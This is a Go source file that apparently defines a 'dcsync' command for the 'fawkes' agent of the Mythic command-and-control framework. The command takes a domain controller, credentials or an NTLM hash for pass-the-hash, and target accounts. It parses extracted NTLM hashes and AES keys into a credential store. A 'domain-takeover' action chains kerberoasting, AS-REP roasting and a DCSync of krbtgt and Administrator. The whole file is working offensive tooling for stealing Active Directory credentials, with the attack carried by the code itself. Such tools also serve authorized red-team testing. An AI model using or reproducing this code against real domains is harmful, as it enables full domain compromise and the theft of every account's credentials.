package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "dcsync",
		Description:         "DCSync — replicate AD account credentials via DRS (Directory Replication Services). Extracts NTLM hashes and Kerberos keys from a Domain Controller without touching LSASS. Use 'domain-takeover' action for automated kerberoast + asrep-roast + dcsync chain.",
		HelpString:          "dcsync -server 192.168.1.1 -username admin@domain.local -password pass -target Administrator\ndcsync -server dc01 -username DOMAIN\\admin -hash aad3b435b51404ee:8846f7eaee8fb117 -target \"Administrator,krbtgt\"\ndcsync -action domain-takeover -server dc01 -username admin@domain.local -password pass",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.006"},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "dcsync_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
			CommandCanOnlyBeLoadedLater: true,
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"domainTakeoverDone": domainTakeoverDone,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"sync", "domain-takeover"},
				Description:      "sync: extract specific account hashes (default). domain-takeover: automated chain — kerberoast + asrep-roast + dcsync krbtgt/Administrator in parallel.",
				DefaultValue:     "sync",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:                "server",
				CLIName:             "server",
				ModalDisplayName:    "Domain Controller",
				Description:         "Domain Controller IP or hostname",
				ParameterType:       agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:        "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "Account with Replicating Directory Changes rights (DOMAIN\\user or user@domain)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication (or use -hash for pass-the-hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NTLM Hash",
				Description:      "NT hash for pass-the-hash (hex, e.g., aad3b435b51404ee:8846f7eaee8fb117 or just the NT hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "Domain name (auto-detected from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackDomainList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "target",
				CLIName:          "target",
				ModalDisplayName: "Target Account(s)",
				Description:      "Account(s) to dump, comma-separated (e.g., Administrator,krbtgt,svc_backup). Not required for domain-takeover.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Operation timeout in seconds (default: 120)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     120,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			server, _ := taskData.Args.GetStringArg("server")
			target, _ := taskData.Args.GetStringArg("target")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:  taskData.Task.ID,
				Success: true,
				OpsecPreBlocked: false,
				OpsecPreMessage: fmt.Sprintf("OPSEC WARNING: DCSync replicates credentials from DC %s via DRS (target: %s). "+
					"Generates Directory Replication Service events (Event ID 4662). "+
					"Detectable by monitoring for non-DC replication requests. "+
					"High-value credentials will be extracted.", server, target),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			server, _ := taskData.Args.GetStringArg("server")
			target, _ := taskData.Args.GetStringArg("target")
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: DCSync replication from %s (target: %s) configured. DRS events will be generated.", server, target),
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			domain := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			var currentAccount string
			for _, line := range strings.Split(responseText, "\n") {
				trimmed := strings.TrimSpace(line)
				// Extract account name: [+] username (RID: 500)
				if strings.HasPrefix(trimmed, "[+] ") && strings.Contains(trimmed, "(RID:") {
					parts := strings.SplitN(trimmed[4:], " (RID:", 2)
					if len(parts) >= 1 {
						currentAccount = strings.TrimSpace(parts[0])
					}
					continue
				}
				if currentAccount == "" {
					continue
				}
				// Hash:   username:rid:lm:nt:::
				if strings.HasPrefix(trimmed, "Hash:") {
					hashPart := strings.TrimSpace(strings.TrimPrefix(trimmed, "Hash:"))
					if hashPart != "" {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "hash",
							Realm:          domain,
							Account:        currentAccount,
							Credential:     hashPart,
							Comment:        "dcsync (DRSGetNCChanges)",
						})
					}
				}
				// AES256: <hex>
				if strings.HasPrefix(trimmed, "AES256:") {
					key := strings.TrimSpace(strings.TrimPrefix(trimmed, "AES256:"))
					if key != "" && !isAllZeros(key) {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "key",
							Realm:          domain,
							Account:        currentAccount,
							Credential:     key,
							Comment:        "dcsync AES-256 key",
						})
					}
				}
				// AES128: <hex>
				if strings.HasPrefix(trimmed, "AES128:") {
					key := strings.TrimSpace(strings.TrimPrefix(trimmed, "AES128:"))
					if key != "" && !isAllZeros(key) {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "key",
							Realm:          domain,
							Account:        currentAccount,
							Credential:     key,
							Comment:        "dcsync AES-128 key",
						})
					}
				}
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] dcsync extracted %d hashes from %s", len(creds), processResponse.TaskData.Callback.Host), true)
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")

			if action == "domain-takeover" {
				return dcsyncDomainTakeover(taskData)
			}

			target, _ := taskData.Args.GetStringArg("target")
			if target == "" {
				response.Success = false
				response.Error = "target is required for sync action"
				return response
			}

			targetCount := len(strings.Split(target, ","))
			displayMsg := fmt.Sprintf("DCSync %s (%d account(s))", server, targetCount)
			response.DisplayParams = &displayMsg

			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("DRS replication request (DCSync) to %s for %s", server, target))

			return response
		},
	})
}

// dcsyncDomainTakeover creates parallel subtask group: kerberoast + asrep-roast + dcsync krbtgt,Administrator
func dcsyncDomainTakeover(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
	response := agentstructs.PTTaskCreateTaskingMessageResponse{
		Success: true,
		TaskID:  taskData.Task.ID,
	}

	server, _ := taskData.Args.GetStringArg("server")
	username, _ := taskData.Args.GetStringArg("username")
	password, _ := taskData.Args.GetStringArg("password")
	hash, _ := taskData.Args.GetStringArg("hash")
	domain, _ := taskData.Args.GetStringArg("domain")

	if server == "" || username == "" {
		response.Success = false
		response.Error = "server and username are required for domain-takeover"
		return response
	}

	// Build auth params shared across subtasks
	authParams := map[string]interface{}{
		"server":   server,
		"username": username,
	}
	if password != "" {
		authParams["password"] = password
	}
	if hash != "" {
		authParams["hash"] = hash
	}
	if domain != "" {
		authParams["domain"] = domain
	}

	// Kerberoast params
	kerbParams := make(map[string]interface{})
	for k, v := range authParams {
		kerbParams[k] = v
	}
	kerbJSON, _ := json.Marshal(kerbParams)

	// ASRep-roast params
	asrepParams := make(map[string]interface{})
	for k, v := range authParams {
		asrepParams[k] = v
	}
	asrepJSON, _ := json.Marshal(asrepParams)

	// DCSync params — target krbtgt and Administrator
	dcParams := make(map[string]interface{})
	for k, v := range authParams {
		dcParams[k] = v
	}
	dcParams["action"] = "sync"
	dcParams["target"] = "krbtgt,Administrator"
	dcJSON, _ := json.Marshal(dcParams)

	tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
		{CommandName: "kerberoast", Params: string(kerbJSON)},
		{CommandName: "asrep-roast", Params: string(asrepJSON)},
		{CommandName: "dcsync", Params: string(dcJSON)},
	}

	completionFunc := "domainTakeoverDone"
	response.CompletionFunctionName = &completionFunc

	groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
		mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
			TaskID:                taskData.Task.ID,
			GroupName:             "domain_takeover",
			GroupCallbackFunction: &completionFunc,
			Tasks:                 tasks,
		},
	)
	if err != nil || !groupResult.Success {
		errMsg := "Failed to create domain takeover subtask group"
		if err != nil {
			errMsg = fmt.Sprintf("%s: %v", errMsg, err)
		}
		response.Success = false
		response.Error = errMsg
		return response
	}

	display := fmt.Sprintf("Domain Takeover: kerberoast + asrep-roast + dcsync krbtgt,Administrator via %s", server)
	response.DisplayParams = &display

	createArtifact(taskData.Task.ID, "Subtask Chain",
		fmt.Sprintf("Domain Takeover chain: kerberoast + asrep-roast + dcsync (target: %s)", server))

	return response
}

// domainTakeoverDone aggregates results from the parallel domain compromise chain.
func domainTakeoverDone(
	taskData *agentstructs.PTTaskMessageAllData,
	subtaskData *agentstructs.PTTaskMessageAllData,
	_ *agentstructs.SubtaskGroupName,
) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})

	summary := "=== Domain Takeover Complete ===\n"
	totalHashes := 0
	if err == nil && searchResult.Success {
		for _, task := range searchResult.Tasks {
			output := getSubtaskResponses(task.ID)
			hashCount := strings.Count(output, "Hash:") + strings.Count(output, "$krb5")
			status := "✓"
			detail := ""
			if task.Status == "error" {
				status = "✗"
				detail = " (error)"
			} else if hashCount > 0 {
				detail = fmt.Sprintf(" (%d hashes)", hashCount)
				totalHashes += hashCount
			} else if strings.Contains(output, "no ") || strings.Contains(output, "No ") {
				detail = " (no targets)"
			}
			summary += fmt.Sprintf("  %s %s%s\n", status, task.CommandName, detail)
		}
	}
	summary += fmt.Sprintf("\nTotal hashes captured: %d\n", totalHashes)

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(summary),
	})

	logOperationEvent(taskData.Task.ID,
		fmt.Sprintf("[CREDENTIAL] Domain takeover complete: %d hashes captured via %s",
			totalHashes, taskData.Callback.Host), true)

	return response
}
